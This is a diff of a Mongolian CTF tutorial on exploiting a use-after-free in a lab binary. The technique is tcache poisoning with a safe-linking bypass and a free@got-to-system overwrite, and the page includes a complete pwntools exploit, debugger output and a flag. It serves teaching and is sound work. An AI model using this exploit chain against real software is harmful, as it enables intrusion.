@@ -4,40 +4,31 @@ description: glibc heap-ийн суурь — chunk, tcache, use-after-free. UAF
 pagefind: false
 ---
 
-Өмнөх бодлогууд **stack** болон **format string** дээр төвлөрсөн. Энэ удаа **heap** — `malloc`/`free`-ийн
-динамик санах ой. glibc-ийн header-гүй сул чөлөөлөлт (`free`) болон **use-after-free (UAF)** алдааг ашиглан
+**Heap** нь `malloc`/`free`-ийн динамик санах ой. glibc-ийн **use-after-free (UAF)** алдааг ашиглан
 **tcache poisoning** хийж, дурын хаягт бичих чадвар олж аваад эцэст нь shell авна.
 
 :::note[Юуны өмнө]
-- [ret2text](../ret2text/) (stack overflow, exploit script бичих), [GOT ба PLT](../../basics/got-plt/) (GOT дарах).
+- **[Heap](../../basics/heap/)** — chunk, bins, tcache, safe-linking.
 - Энэ хуудас glibc **2.35+** (tcache + safe-linking) дээр ажиллана.
 :::
 
-## glibc heap-ийн суурь
+## tcache poisoning гэж юу вэ
 
-`malloc` нь санах ойг **chunk** болгон өгдөг. Chunk бүр жижиг header-тэй:
+tcache нь `fd` заагчаар холбогдсон энгийн **singly-linked list**. Хэрэв free хийсэн chunk-ийн
+`fd`-г (UAF, buffer overflow эсвэл double-free-ээр) дарж чадвал, дараагийн `malloc` уг `fd`-г дагаж **чиний
+сонгосон дурын хаяг** дээр chunk "байгаа" мэт буцаана. Тэр chunk руу бичих нь = **дурын хаягт бичих** primitive.
 
-```text
-   +--------+--------+----------------------------+
-   | prev   | size   |  хэрэглэгчийн өгөгдөл ...   |
-   +--------+--------+----------------------------+
-            ^ malloc энэ хаягийг буцаана
-```
+![tcache 0x60 жагсаалтын өөрчлөлт: ① free(C) → толгой C; ② free(D) → D→C→∅ ба notes[3] нь free хийсэн D-г хэвээр заана (dangling, UAF); ③ dangling notes[3]-ээр D.fd-г &notes болгож дарна (poison); ④ malloc нь D-г буцаана; ⑤ дараагийн malloc нь &notes-ийг буцаана — дурын хаягт chunk авлаа.](../../../../assets/pwn/tcache-uaf.svg)
 
-**tcache** (thread cache): чөлөөлсөн жижиг chunk-уудыг (≤ 0x408) хэмжээ тус бүрээр нь **нэг чиглэлт жагсаалтад**
-(LIFO) хадгална. `free` хийхэд chunk tcache-ийн толгойд ордог, `malloc` хийхэд толгойгоос авна. Жагсаалтын
-дараагийн заагчийг (`fd`) чөлөөлсөн chunk-ийн **эхний 8 байтад** хадгалдаг.
+Ерөнхий алхам:
 
-**Safe-linking** (glibc 2.32+): `fd`-г задруулахгүйн тулд **xor-оор нуудаг**:
+1. Ижил хэмжээний хоёр chunk (`C`, `D`) `free` хийнэ → tcache жагсаалт `D → C`.
+2. Чөлөөлсөн `D`-ийн `fd`-г зорилтот хаяг руу дарна (safe-linking тул `(D>>12) XOR зорилтот` хэлбэрээр).
+3. Хоёр `malloc` хийнэ: эхнийх нь `D`, хоёр дахь нь **зорилтот хаяг** дээрх chunk.
+4. Тэнд бичиж, жишээ нь GOT entry-г `system` болгоно.
 
-```text
-stored_fd = (chunk_хаяг >> 12) XOR дараагийн_chunk
-```
-
-Тиймээс fd-г хуурахын тулд chunk байрлаж буй **page-ийн хаягийг (>>12)** мэдэх хэрэгтэй — доор үүнийг leak хийнэ.
-
-**Том** chunk (> 0x408, tcache-д багтахгүй) чөлөөлвөл **unsorted bin** рүү орж, `fd`/`bk` нь libc доторх
-`main_arena` руу заана — энэ нь libc-ийн хаягийг **leak** хийх сонгодог арга.
+Хоёр зүйл хэрэгтэй: (а) `fd`-г дарах **бичих алдаа** (энд UAF), (б) safe-linking-ийг тойрох **heap leak**
+(`page >> 12`). Хоёуланг нь доорх challenge дээр олж авна.
 
 ## Бодлого
 
@@ -57,149 +48,259 @@ $ checksec --file=./heap
    PIE: No PIE               # GOT-ийн хаяг тогтмол
 ```
 
-## Шийдэл
+## Бодолт
 
-### 1. Эмзэг код
+### 0. Бэлдэц
+
+`pwn template`-ээр бэлдэц үүсгээд ([pwntools](../../tools/pwntools/#pwn-template)) цэстэй харилцах
+туслахуудыг нэмнэ:
+
+```python title="exploit.py"
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+from pwn import *
+
+exe = context.binary = ELF(args.EXE or './heap')
+libc = ELF(args.LIBC or './libc.so.6', checksec=False)
+
+host = args.HOST or 'localhost'
+port = int(args.PORT or 1337)
+
+
+def start_local(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+def start_remote(argv=[], *a, **kw):
+    io = connect(host, port)
+    if args.GDB:
+        gdb.attach(io, gdbscript=gdbscript)
+    return io
+
+def start(argv=[], *a, **kw):
+    if args.LOCAL:
+        return start_local(argv, *a, **kw)
+    else:
+        return start_remote(argv, *a, **kw)
+
+gdbscript = '''
+tbreak main
+continue
+'''.format(**locals())
+
+# -- Exploit goes here --
+
+io = start()
+
+def add(i, s, d=b'A'):
+    io.sendlineafter(b'> ', b'1'); io.sendlineafter(b'idx: ', str(i).encode())
+    io.sendlineafter(b'size: ', str(s).encode()); io.sendafter(b'data: ', d)
+def edit(i, d): io.sendlineafter(b'> ', b'2'); io.sendlineafter(b'idx: ', str(i).encode()); io.sendafter(b'data: ', d)
+def show(i):    io.sendlineafter(b'> ', b'3'); io.sendlineafter(b'idx: ', str(i).encode()); return u64(io.recv(8).ljust(8, b'\x00'))
+def dele(i):    io.sendlineafter(b'> ', b'4'); io.sendlineafter(b'idx: ', str(i).encode())
+```
+
+Ажиллуулах горимууд: `./exploit.py LOCAL GDB` (pwndbg хавсаргана), `./exploit.py LOCAL` (локал),
+`./exploit.py HOST=… PORT=…` (remote).
+
+### 1. Ямар primitive байна вэ (UAF)
+
+Алдаа нь `delete`-д — `free` хийгээд заагчийг нь **цэвэрлэдэггүй**:
 
 ```c
 static void del(void) {
     printf("idx: "); int i = readint(); if (i < 0 || i >= MAX) return;
-    free(notes[i]);        // BUG: pointer-ийг NULL болгодоггүй  ->  use-after-free
+    free(notes[i]);        // BUG: notes[i]-г NULL болгодоггүй -> use-after-free
 }
 ```
 
-`free` хийсэн ч `notes[i]` хэвээр хоцорно. Тиймээс `edit(i)` → чөлөөлсөн chunk-д **бичих** (tcache `fd` дарах),
-`show(i)` → чөлөөлсөн chunk-ийг **унших** (leak) боломжтой. Энэ хоёр нь heap exploit-ийн гол түлхүүр.
+Тиймээс `free` хийсэн chunk руу заагч үлдэж, `edit(i)` → free хийсэн chunk-д **бичнэ** (tcache `fd` дарах),
+`show(i)` → free хийсэн chunk-ийг **уншина** (leak). Бүх дараагийн алхам энэ хоёр дээр тулгуурлана. No PIE тул
+`notes`, `free@got` тогтмол: `exe.sym['notes']`, `exe.got['free']`.
 
-No PIE тул binary-ийн хаягууд тогтмол. Эдгээрийг exploit-ийн эхэнд тэмдэглэнэ:
+### 2. libc хаягийг leak хийх
 
-```text
-notes  = 0x404080        # .bss дэх notes[] массив
-free@got = 0x404000      # дарах GOT entry
+**Код руугаа нэм:**
+
+```python
+add(0, 0x500); add(1, 0x20)     # A (том -> unsorted) + guard (top-той нийлэхээс сэргийлнэ)
+dele(0)                         # A -> unsorted bin
+leak = show(0)                  # A.fd-г уншина
+log.info('leak = %#x', leak)
 ```
 
-### 2. libc leak (unsorted bin)
-
-tcache-д багтахгүй том chunk (`0x500`) чөлөөлвөл **unsorted bin** руу орж, `fd`/`bk` нь libc доторх
-`main_arena`-г заана. `guard` chunk нь том chunk-ийг top-той нийлэхээс сэргийлнэ. Чөлөөлсний дараа pwndbg-ээр
-хармаар (бодит гаралт):
+**Ажиллуул, pwndbg-д шалга.** `dele(0)`-ийн дараа зогсоож:
 
 ```ansi
 [1;31mpwndbg>[0m bins
-tcachebins
-empty
 unsortedbin
-all: [34m0x55[0m…b030 —▸ [34m0x7049bb012ac8[0m [32m(main_arena+8)[0m ◂— [34m0x55[0m…b030
+all: [34m0x555…5030[0m —▸ [34m0x7049bb012ac8[0m [32m(main_arena+8)[0m ◂— …
 ```
 
-`main_arena+8` руу заасан `0x7049bb012ac8` нь **libc доторх** хаяг. UAF `show`-оор уншаад base-ийг бодно:
-
-```python
-add(0, 0x500); add(1, 0x20)        # A + guard
-dele(0)                            # A -> unsorted bin
-leak = u64(show(0))                # 0x7049bb012ac8  (A.fd = main_arena+8)
-libc.address = leak - 0x212ac8     # 0x7049bae00000  (энэ libc дээрх тогтмол зай)
-add(0, 0x500)                      # A-г буцааж авна (цэвэрлэгээ)
-#  -> system = libc.sym['system'] = 0x7049bae5c2e0
-```
-
-### 3. heap leak (safe-linking key)
-
-Safe-linking-ийг тойрохын тулд chunk байгаа **page-ийн хаяг** (`>>12`) хэрэгтэй. tcache-д **ганц** chunk
-чөлөөлөхөд `fd = (chunk>>12) XOR 0 = chunk>>12` — яг тэр түлхүүр нь `fd`-д хэвтэнэ. UAF `show`-оор уншина:
-
-```python
-add(2, 0x50); add(3, 0x50)         # C, D (chunk 0x60)
-dele(2)                            # C -> tcache (ганцаараа)
-key = u64(show(2))                 # 0x3d93b   (= C>>12 = D>>12, нэг page дээр)
-```
-
-### 4. tcache poisoning → notes[] дээр бичих
-
-tcache бол нэг чиглэлт жагсаалт: `free` нь chunk-ийг **толгойд** нэмж, `malloc` нь толгойгоос авна. `delete`
-хийхэд программ `notes[i]`-г NULL болгодоггүй тул **чөлөөлсөн chunk руу заагч хэвээр үлдэнэ (dangling)** —
-энэ нь UAF. Тэр dangling заагчаар `edit` хийж жагсаалтын `fd`-г хуурна:
-
-![tcache 0x60 жагсаалтын өөрчлөлт: ① free(C) → толгой C; ② free(D) → D→C→∅ ба notes[3] нь чөлөөлсөн D-г хэвээр заана (dangling, UAF); ③ dangling notes[3]-ээр D.fd-г &notes болгож дарна (poison); ④ malloc нь D-г буцаана; ⑤ дараагийн malloc нь &notes-ийг буцаана — дурын хаяг гаргаж авлаа.](../../../../assets/pwn/tcache-uaf.svg)
-
-Хоёр дахь chunk-ийг (D) чөлөөлөхөд tcache `0x60` жагсаалт `D —▸ C —▸ NULL` болно. Dangling `notes[3]`-ээр D-ийн
-`fd`-г `edit` хийж **`notes` руу чиглүүлнэ**. pwndbg нь fd-г задлаад chain хаашаа чиглэснийг харуулна — poison-ийн өмнө ба дараа:
+`leak` нь `main_arena+8` руу зааж байна — **libc доторх** хаяг. libc base хүртэлх зай тогтмол; `vmmap`-аар батал:
 
 ```ansi
-[1;31mpwndbg>[0m tcachebins          [90m# poison-ийн ӨМНӨ[0m
-[34m0x60[0m [ 2]: [34m0x55[0m…b8f0 —▸ [34m0x55[0m…b890 ◂— 0            [90m# D —▸ C —▸ NULL[0m
-
-[1;31mpwndbg>[0m tcachebins          [90m# D.fd-г дарсны ДАРАА[0m
-[34m0x60[0m [ 2]: [34m0x55[0m…b8f0 —▸ [34m0x404080[0m [32m(notes)[0m —▸ …     [90m# D —▸ &notes ![0m
+[1;31mpwndbg>[0m vmmap libc
+[34m0x7049bae00000[0m … libc.so.6          [90m# base[0m
+[1;31mpwndbg>[0m p/x [34m0x7049bb012ac8[0m - [34m0x7049bae00000[0m
+$1 = [34m0x212ac8[0m                        [90m# <- энэ зайг код руугаа тавина[0m
 ```
 
-`fd`-д бичих утга нь **нуугдсан** (`key XOR зорилтот`) байх ёстой. Санах ойд хэвтэх raw байт өөрчлөгдөхийг хар:
-
-```text
-D.fd raw  poison-оос өмнө = 0x3d9061ab   (задлавал 0x55…b890 = C)
-бичих утга = key ^ &notes = 0x3d93b ^ 0x404080 = 0x4399bb
-D.fd raw  poison-оос дараа = 0x4399bb     (задлавал key ^ 0x4399bb = 0x404080 = &notes)
-```
+**Олсон хамаарлаа код руугаа буцааж тавь:**
 
 ```python
-dele(3)                            # D -> tcache (толгой = D)
-edit(3, p64(key ^ notes))          # D.fd = mangle(&notes) = 0x4399bb
-add(4, 0x50)                       # D-г буцаана (толгой одоо &notes)
-add(5, 0x50, p64(free_got))        # &notes-ийг буцаана -> notes[0] = free@got
+libc.address = leak - 0x212ac8
+log.info('libc = %#x  system = %#x', libc.address, libc.sym['system'])
+add(0, 0x500)                   # A-г unsorted-оос буцааж авна (цэвэрлэгээ)
 ```
 
-Одоо `notes[0]` нь `free@got`-ийг заана. `edit(0)` хийвэл тэр хаягт **шууд бичнэ** — `free@got` утга өөрчлөгдөхийг
-UAF `show(0)`-оор баталж болно:
-
-```text
-free@got  edit-ээс өмнө = 0x7049baeb5360   (lazy-bind resolver)
-free@got  edit-ээс дараа = 0x7049bae5c2e0   (= system !)
-```
-
-```python
-edit(0, p64(libc.sym['system']))   # *notes[0] = system  =>  free@got = system
-```
-
-:::note[Яагаад шууд `free@got` дээр chunk гаргадаггүй вэ]
-Орчин үеийн glibc-д `tcache_get` нь авсан chunk-ийн `key`-г (chunk+8) **NULL болгодог**. Шууд `free@got`
-(0x404000) дээр гаргавал хажуугийн `0x404008` = `puts@got` NULL болж, цэс дараагийн `puts`-д унана. Мөн
-`0x404038` (`atoi@got`) нь 16-д тэгшлэгдээгүй тул tcache шалгалтанд унана. Тиймээс эхлээд 16-align `notes`
-(0x404080) дээр гаргаж, энгийн `edit`-ээр `free@got` рүү цэвэрхэн бичдэг.
+:::tip
+Өөр libc дээр зай өөр. `p/x <main_arena+8 хаяг> - <libc base>` бодно, эсвэл symbol байвал
+`leak - libc.sym['main_arena'] - 0x10`.
 :::
 
-### 5. Trigger
+### 3. heap хаягийг leak хийх (safe-linking key)
 
-`free@got` одоо `system`. "/bin/sh" агуулсан note-ийг `delete` хийхэд `free(ptr)` → `system("/bin/sh")`:
+Safe-linking: `fd = (page>>12) XOR дараагийн`. Хуурахын тулд `page>>12` хэрэгтэй. tcache-д **ганц** chunk
+байхад `fd = page>>12` — шууд уншиж авна.
+
+**Нэм:**
 
 ```python
-dele(7)                            # free(notes[7]="/bin/sh")  ->  system("/bin/sh")
-#  uid=1000(ctf) ...   flag{...}
+add(2, 0x50); add(3, 0x50)      # C, D (0x60 chunk)
+dele(2)                         # C -> tcache (ганцаараа)
+key = show(2)                   # fd = C>>12
+log.info('key = %#x', key)
 ```
+
+**Шалга.** `tcachebins`-д C-ийн бодит хаягийг хараад `>>12` нь `key`-тэй тохирч байгааг батал:
+
+```ansi
+[1;31mpwndbg>[0m tcachebins
+[34m0x60[0m [ 1]: [34m0x555…5890[0m ◂— 0          [90m# key == (0x555…5890 >> 12)[0m
+```
+
+C ба D нэг page дээр тул энэ `key` нь D-д ч хүчинтэй.
+
+### 4. tcache-ийг poison хийх
+
+Одоо [tcache poisoning](#tcache-poisoning-гэж-юу-вэ)-г бодит байдал дээр хийнэ: зорилтот хаяг маань `&notes`.
+Dangling `notes[3]`-ээр D-ийн `fd`-г дарж **`&notes` руу** чиглүүлнэ. **Нэм:**
+
+```python
+dele(3)                         # D -> tcache (толгой = D, D.fd = C)
+edit(3, p64(key ^ exe.sym['notes']))   # D.fd -> mangle(&notes)
+```
+
+**Шалга — poison ажилласан уу?** `tcachebins` chain `(notes)` руу чиглэвэл болсон. pwndbg нь fd-г задлаад
+chain хаашаа чиглэснийг харуулна:
+
+```ansi
+[1;31mpwndbg>[0m tcachebins          [90m# ӨМНӨ:  0x60 [ 2]: 0x555…58f0 —▸ 0x555…5890 ◂— 0   (D —▸ C)[0m
+[1;31mpwndbg>[0m tcachebins          [90m# edit-ийн ДАРАА:[0m
+[34m0x60[0m [ 2]: [34m0x555…58f0[0m —▸ [34m0x404080[0m [32m(notes)[0m —▸ …      [90m# D —▸ &notes ![0m
+```
+
+`(notes)` руу заагаагүй бол `key` эсвэл `&notes` буруу. Raw fd-г `show(3)`-оор уншаад `key`-ээр задал:
+`key ^ show(3) == &notes` байх ёстой (gdb: `p/x key ^ notes`).
+
+**Одоо хоёр удаа `malloc` хийнэ.** Эхний `malloc` нь D-г, хоёр дахь нь хуурсан `&notes`-ийг буцаана. Хоёр дахь
+chunk руу бичсэн 8 байт нь шууд `notes[0]`-д тусна — тэнд `free@got`-ийг тавина:
+
+```python
+add(4, 0x50)                    # -> D
+add(5, 0x50, p64(exe.got['free']))   # -> &notes;  notes[0] = free@got
+```
+
+`break malloc; finish`-ээр `$rax`-ийг харвал эхний `malloc` D-г, хоёр дахь нь **`0x404080` (&notes)**-ийг
+буцааж буй нь poison амжилттай болсныг батална:
+
+```ansi
+[1;31mpwndbg>[0m break malloc
+[1;31mpwndbg>[0m c   [90m# add(4)[0m
+[1;31mpwndbg>[0m finish
+…  $rax = [34m0x555…58f0[0m        [90m# D[0m
+[1;31mpwndbg>[0m c   [90m# add(5)[0m
+[1;31mpwndbg>[0m finish
+…  $rax = [34m0x404080[0m          [90m# &notes  <- дурын хаягт chunk авлаа![0m
+```
+
+### 5. GOT дарж shell авах
+
+`notes[0]` одоо `free@got` руу заана → `edit(0)` тэр хаягт **шууд бичнэ**. `edit(0)`-ийн өмнө/дараа `free@got`-г
+`x/gx 0x404000`-оор (эсвэл UAF `show(0)`-оор) харьцуул:
+
+```ansi
+[1;31mpwndbg>[0m x/gx 0x404000       [90m# edit(0)-ийн ДАРАА[0m
+0x404000: [34m0x7049bae5c2e0[0m      [90m# = system  (өмнө нь lazy-bind resolver байсан)[0m
+```
+
+**Нэм, trigger:**
+
+```python
+add(6, 0x20, b'/bin/sh\x00')    # trigger chunk
+edit(0, p64(libc.sym['system']))   # free@got = system
+dele(6)                         # free("/bin/sh") -> system("/bin/sh")
+io.interactive()
+```
+
+:::note[Яагаад шууд `free@got` дээр биш, `notes` дээр гаргадаг вэ]
+`tcache_get` нь авсан chunk-ийн `key`-г (chunk+8) NULL болгодог. Шууд `free@got` (0x404000) дээр гаргавал
+хажуугийн `0x404008` (`puts@got`) NULL болж цэс унана; `atoi@got` (0x404038) нь 16-д тэгшлэгдээгүй тул
+tcache шалгалтанд унана. Тиймээс 16-align `notes` (0x404080) дээр гаргаж, энгийн `edit`-ээр GOT рүү бичдэг.
+:::
 
 <details>
 <summary>Бүрэн exploit</summary>
 
-```python
+```python title="exploit.py"
 #!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 from pwn import *
-context.arch = 'amd64'
-exe  = ELF('./heap', checksec=False)
-libc = ELF('./libc.so.6', checksec=False)
-io   = process('./heap')      # эсвэл: remote(HOST, PORT)
 
-def add(i,s,d=b'A'):
-    io.sendlineafter(b'> ',b'1'); io.sendlineafter(b'idx: ',str(i).encode())
-    io.sendlineafter(b'size: ',str(s).encode()); io.sendafter(b'data: ',d)
-def edit(i,d):
-    io.sendlineafter(b'> ',b'2'); io.sendlineafter(b'idx: ',str(i).encode()); io.sendafter(b'data: ',d)
-def show(i):
-    io.sendlineafter(b'> ',b'3'); io.sendlineafter(b'idx: ',str(i).encode()); return u64(io.recv(8).ljust(8,b'\0'))
-def dele(i):
-    io.sendlineafter(b'> ',b'4'); io.sendlineafter(b'idx: ',str(i).encode())
+exe = context.binary = ELF(args.EXE or './heap')
+libc = ELF(args.LIBC or './libc.so.6', checksec=False)
+
+host = args.HOST or 'localhost'
+port = int(args.PORT or 1337)
+
+
+def start_local(argv=[], *a, **kw):
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+def start_remote(argv=[], *a, **kw):
+    io = connect(host, port)
+    if args.GDB:
+        gdb.attach(io, gdbscript=gdbscript)
+    return io
+
+def start(argv=[], *a, **kw):
+    return start_local(argv, *a, **kw) if args.LOCAL else start_remote(argv, *a, **kw)
+
+gdbscript = '''
+tbreak main
+continue
+'''.format(**locals())
+
+# -- Exploit goes here --
+
+io = start()
+
+def add(i, s, d=b'A'):
+    io.sendlineafter(b'> ', b'1'); io.sendlineafter(b'idx: ', str(i).encode())
+    io.sendlineafter(b'size: ', str(s).encode()); io.sendafter(b'data: ', d)
+def edit(i, d): io.sendlineafter(b'> ', b'2'); io.sendlineafter(b'idx: ', str(i).encode()); io.sendafter(b'data: ', d)
+def show(i):    io.sendlineafter(b'> ', b'3'); io.sendlineafter(b'idx: ', str(i).encode()); return u64(io.recv(8).ljust(8, b'\x00'))
+def dele(i):    io.sendlineafter(b'> ', b'4'); io.sendlineafter(b'idx: ', str(i).encode())
 
 notes, free_got = exe.sym['notes'], exe.got['free']
 
-add(7, 0x20, b'/bin/sh\x00')                 # trigger chunk
+add(6, 0x20, b'/bin/sh\x00')                 # trigger chunk
 add(0, 0x500); add(1, 0x20); dele(0)         # libc leak
 libc.address = show(0) - 0x212ac8; add(0, 0x500)
 add(2, 0x50); add(3, 0x50); dele(2)          # heap key
@@ -207,15 +308,15 @@ key = show(2)
 dele(3); edit(3, p64(key ^ notes))           # tcache poison -> &notes
 add(4, 0x50); add(5, 0x50, p64(free_got))    # notes[0] = free@got
 edit(0, p64(libc.sym['system']))             # free@got = system
-dele(7)                                      # system("/bin/sh")
+dele(6)                                      # system("/bin/sh")
 io.interactive()
 ```
 
 </details>
 
 ```console
-$ ./exploit.py
-[*] libc base = 0x7c00...
+$ ./exploit.py LOCAL
+[*] libc = 0x7049bae00000  system = 0x7049bae5c2e0
 uid=1000(ctf) ...
 flag{h34p_tc4che_p01s0n_g0t_0verwr1te}
 ```
@@ -224,53 +325,14 @@ flag{h34p_tc4che_p01s0n_g0t_0verwr1te}
 
 ```console
 $ cd challenges/pwn/userland/heap
-$ make run              # docker, nc localhost 1337
-$ ./exploit.py          # эсвэл python3 exploit.py REMOTE
+$ ./exploit.py LOCAL              # локал binary-тай
+$ make run && ./exploit.py HOST=localhost PORT=1337   # docker сервер лүү
 ```
 
-## Debug хийх
-
-Дээрх алхмуудын pwndbg гаралтыг (`bins`, `tcachebins`) өөрөө гаргаж, утга өөрчлөгдөхийг нүдээр харах нь
-heap exploit сурах гол арга. Энэ бодлогыг debug хийх ажлын урсгал:
-
-**Хавсаргах.** Программ цэсний `read`-д блоклож зогсдог тул exploit-ээ тодорхой алхам хүртэл ажиллуулаад,
-өөр terminal-аас process-ийн PID-ээр хавсаргахад heap тэр хэвээрээ зогсоно:
-
-```ansi
-$ gdb -p $(pgrep -n heap)
-[1;31mpwndbg>[0m tcachebins        [90m# яг тэр мөчийн tcache-ийн төлөв[0m
-[1;31mpwndbg>[0m bins              [90m# unsorted (libc leak), fastbin, tcache[0m
-[1;31mpwndbg>[0m vis_heap_chunks   [90m# бүх chunk-ийн header + fd/bk-г зураглах[0m
-```
-
-**Poison-ийг батлах — `malloc`-ийн буцаалт.** Poison амжилттай эсэхийг хамгийн шууд шалгах нь дараагийн
-`malloc` юуг буцаахыг харах. `break malloc`, `finish`-ээр `$rax`-ийг ажиглавал хоёр дахь нь **`notes`-ийг
-буцаана** (бодит гаралт):
-
-```ansi
-[1;31mpwndbg>[0m break malloc
-[1;31mpwndbg>[0m continue          [90m# add(4) -> D-г буцаана[0m
-[1;31mpwndbg>[0m finish
-...  $rax = [34m0x55[0m…b8f0     [90m# D[0m
-[1;31mpwndbg>[0m continue          [90m# add(5) -> poison-оор &notes-ийг буцаана[0m
-[1;31mpwndbg>[0m finish
-...  $rax = [34m0x404080[0m      [90m# &notes  <-  дурын хаяг гаргаж авлаа![0m
-```
-
-**Арифметикаа шалгах.** Safe-linking-ийн mangle/demangle-г гараар батлах:
-
-```ansi
-[1;31mpwndbg>[0m p/x [34m0x3d93b[0m ^ [34m0x404080[0m      [90m# key ^ &notes  ->  fd-д бичих утга[0m
-$1 = [34m0x4399bb[0m
-[1;31mpwndbg>[0m p/x [34m0x3d93b[0m ^ [34m0x4399bb[0m      [90m# key ^ (store)  ->  буцаан задлах[0m
-$2 = [34m0x404080[0m                       [90m# = &notes  ✓[0m
-```
-
-Эцэст нь `x/gx 0x404000`-оор `free@got` нь `system` болсныг шалгаад `delete`-ийг trigger хийнэ.
 
 ## Хамгаалалт
 
-- **tcache double-free хамгаалалт** (`key`) — нэг chunk-ийг дараалан 2 удаа чөлөөлвөл илрүүлнэ.
+- **tcache double-free хамгаалалт** (`key`) — нэг chunk-ийг дараалан 2 удаа free хийвэл илрүүлнэ.
 - **Safe-linking** — `fd`-г xor-оор нууна (heap leak шаардана).
 - **Full RELRO** бол GOT бичигдэхгүй — тэр үед `__free_hook` (хуучин glibc), FSOP (`_IO_FILE`), эсвэл
   `__exit_funcs` зэрэг өөр target руу чиглэдэг.
